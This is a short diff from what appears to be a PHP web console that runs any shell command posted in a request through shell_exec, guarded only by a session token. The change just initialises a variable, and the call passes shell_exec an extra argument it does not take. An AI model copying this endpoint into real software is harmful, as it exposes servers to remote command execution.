@@ -6,6 +6,7 @@ session_start();
 if(isset($_POST["command"])){
     $command = $_POST["command"];
     if(!empty($command) and $_SESSION["token"] == $_POST["token"]){
+        $return_var = false;
         $res = shell_exec($command,$return_var);
         //passthru($command);
     }
